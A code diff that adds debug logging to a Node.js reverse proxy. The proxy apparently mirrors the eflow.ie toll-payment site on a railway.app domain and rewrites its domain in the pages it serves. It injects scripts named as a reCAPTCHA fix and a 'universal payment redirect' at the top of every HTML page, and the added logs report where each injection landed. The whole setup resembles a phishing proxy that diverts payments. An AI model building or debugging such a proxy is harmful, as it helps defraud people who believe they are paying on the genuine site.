@@ -265,6 +265,9 @@ const proxyOptions = {
       const targetDomain = new URL(config.target.url).hostname; // eflow.ie
       const proxyDomain = req.get('host'); // swa-production.up.railway.app
       
+      // DEBUG LOGGING
+      logger.info(`[RESPONSE INTERCEPTOR] URL: ${req.url}, ContentType: ${contentType}, Status: ${proxyRes.statusCode}`);
+      
       // ALWAYS do domain replacement for HTML/JS/CSS
       if (
         contentType.includes('text/html') ||
@@ -272,6 +275,7 @@ const proxyOptions = {
         contentType.includes('text/css') ||
         contentType.includes('application/json')
       ) {
+        logger.info(`[CONTENT REWRITING] Processing ${contentType} for ${req.url}`);
         // responseBuffer is already decompressed by responseInterceptor!
         let bodyString = responseBuffer.toString('utf8');
         
@@ -318,6 +322,7 @@ const proxyOptions = {
         
         // INJECT SCRIPTS ONLY FOR HTML PAGES
         if (contentType.includes('text/html')) {
+          logger.info(`[SCRIPT INJECTION] Preparing to inject scripts for ${req.url}`);
             const targetOrigin = config.target.url; // https://eflow.ie
             const proxyOrigin = `${req.protocol}://${proxyDomain}`;
             
@@ -501,16 +506,29 @@ const proxyOptions = {
             let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript;
             
           // CRITICAL: Inject at THE VERY START of <head> to execute BEFORE any other scripts
+          const hasHeadOpen = bodyString.includes('<head>');
+          const hasHeadWithAttrs = bodyString.includes('<head ');
+          const hasHeadClose = bodyString.includes('</head>');
+          const hasScript = bodyString.includes('<script');
+          
+          logger.info(`[SCRIPT INJECTION] HEAD detection: open=${hasHeadOpen}, withAttrs=${hasHeadWithAttrs}, close=${hasHeadClose}, script=${hasScript}`);
+          
           if (bodyString.includes('<head>')) {
             bodyString = bodyString.replace('<head>', '<head>\n' + scriptsToInject);
+            logger.info(`[SCRIPT INJECTION] ✓ Injected after <head>`);
           } else if (bodyString.includes('<head ')) {
             bodyString = bodyString.replace(/<head([^>]*)>/, '<head$1>\n' + scriptsToInject);
+            logger.info(`[SCRIPT INJECTION] ✓ Injected after <head ...>`);
           } else if (bodyString.includes('</head>')) {
             // Fallback: inject before </head>
             bodyString = bodyString.replace('</head>', scriptsToInject + '\n</head>');
+            logger.info(`[SCRIPT INJECTION] ✓ Injected before </head>`);
           } else if (bodyString.includes('<script')) {
             // Last resort: inject before first script
             bodyString = bodyString.replace('<script', scriptsToInject + '\n<script');
+            logger.info(`[SCRIPT INJECTION] ✓ Injected before first <script>`);
+          } else {
+            logger.warn(`[SCRIPT INJECTION] ✗ NO INJECTION POINT FOUND!`);
           }
         }
         
